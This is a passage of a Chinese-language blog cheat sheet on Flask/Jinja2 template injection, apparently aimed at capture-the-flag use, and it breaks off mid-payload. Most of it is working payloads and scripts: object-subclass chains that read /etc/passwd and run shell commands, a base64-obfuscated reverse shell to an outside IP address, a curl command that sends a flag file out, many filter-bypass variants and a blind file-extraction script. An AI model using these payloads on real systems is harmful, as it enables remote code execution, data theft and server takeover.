环境下测试</h3><p>测试环境：2.7.12</p><p>①获取类对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure><p>②寻找基类<code>object</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; requests.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;request.__class__.__mro__[8]</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p></blockquote><p>③寻找可用的引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, 等等</span><br></pre></td></tr></table></figure><p>④尝试文件读取</p><p><strong>payload</strong></p><p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code>，使用file方法可以读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">requests.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405233521992.png" alt></p><p><strong>Payload 2 利用&lt;class ‘warnings.catch_warnings’&gt;</strong></p><p>’catch_warnings’可以进一步构造来执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()   </span><br><span class="line"></span><br><span class="line"># 引用__builtins__和file模块</span><br></pre></td></tr></table></figure><p>⑤命令执行</p><p>寻找包含<code>os</code>模块的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num &#x3D; 0</span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405235926575.png" alt></p><p>这里命令执行没有回显，用popen函数带出结果或者通过反弹shell和利用<code>curl</code>带出</p><p>改造后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>反弹shell方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure><p>curl带出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;x.x.x.x&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure><ul><li>扩展使用</li></ul><p>已知函数名可获取函数信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure><p>可构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) </span><br><span class="line"></span><br><span class="line"># 带回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>一般payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-03-Python3-环境测试"><a href="#0x-03-Python3-环境测试" class="headerlink" title="0x 03 Python3 环境测试"></a>0x 03 Python3 环境测试</h3><p>类似于Python2的,常用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&quot;ls&quot;).read()</span><br><span class="line"># &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br><span class="line"># &lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat</span><br><span class="line">&#x2F;flag&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块,fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;system&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;system&#39;,num,item)</span><br><span class="line">         if &#39;sys&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;sys&#39;,num,item)</span><br><span class="line">         if &#39;__builtins__&#39; in item.__init__.__globals__:</span><br><span class="line">          print(&#39;__builtins__&#39;,num,item)</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>Jinja2的for循环处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-04-ByPass"><a href="#0x-04-ByPass" class="headerlink" title="0x 04 ByPass"></a>0x 04 ByPass</h3><p><strong><code>.</code>被过滤</strong></p><p>基础payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>使用<code>getattr()</code>或者<code>|attr()</code>或者<code>[]</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__&#x3D;&gt;getattr([],&#39;__class__&#39;)</span><br><span class="line">[].__class__.__base__&#x3D;&gt;getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]&#x3D;&gt;getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__&#x3D;&gt;getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>其他</p><p>Flask在渲染模板的时候，有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__&#x3D;&#x3D;&#x3D;&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure><p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。</p><p>由于里面的内容已经是字符串了，还可以做一个这样的变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__&#x3D;&#x3D;&#x3D;&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;]</span><br></pre></td></tr></table></figure><p><strong><code>_</code>被过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line"># &#39;__class__&#39;&#x3D;&#x3D;&gt;dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2</span><br></pre></td></tr></table></figure><p><strong>中括号被过滤</strong></p><p>可以用<code>getitem</code>或者<code>pop</code>进行绕过过滤</p><ul><li>读取文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.linecache.os.pop</span><br></pre></td></tr></table></figure><p><strong>引号被过滤</strong></p><ul><li>chr函数绕过过滤</li></ul><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>借助request对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><ul><li>过滤引号下的命令执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>过滤双括号</strong></p><ul><li>盲命令执行：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200407002155982.png" alt></p><ul><li>文件盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:5000?name&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload&#x3D;&quot;&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;lihuaiqiu&#39;).read()[&quot;+str(i)+&quot;:&quot;+str(i+1)+&quot;]&#x3D;&#x3D;&#39;&quot;+chr(j)+&quot;&#39; %&#125;~ok~&#123;% endif %&#125;&quot;</span><br><span class="line">        true_url&#x3D;url+payload</span><br><span class="line">        r&#x3D;requests.get(true_url)</span><br><span class="line">        if &#39;ok&#39; in r.text:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure><h3 id="0x-05-过滤trick"><a href="#0x-05-过滤trick" class="headerlink" title="0x 05 过滤trick"></a>0x 05 过滤trick</h3><p><strong>Python的一切皆对象思想</strong></p><p>过滤掉了<code>class和request</code>,通过<code>session</code>构造出<code>object</code>，payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure><p><strong><code>__enter__与__init__</code>的相似性</strong></p><p>通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p><ul><li>利用转义字符（16进制）过滤<code>.</code>和<code>_</code></li></ul><blockquote><p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>利用requests</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read()</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure><h3 id="0x-06-最后总结"><a href="#0x-06-最后总结" class="headerlink" title="0x 06 最后总结"></a>0x 06 最后总结</h3><p><strong>Python 2.7</strong></p><p>jinja2的for循环一把梭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>Python 3.7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() 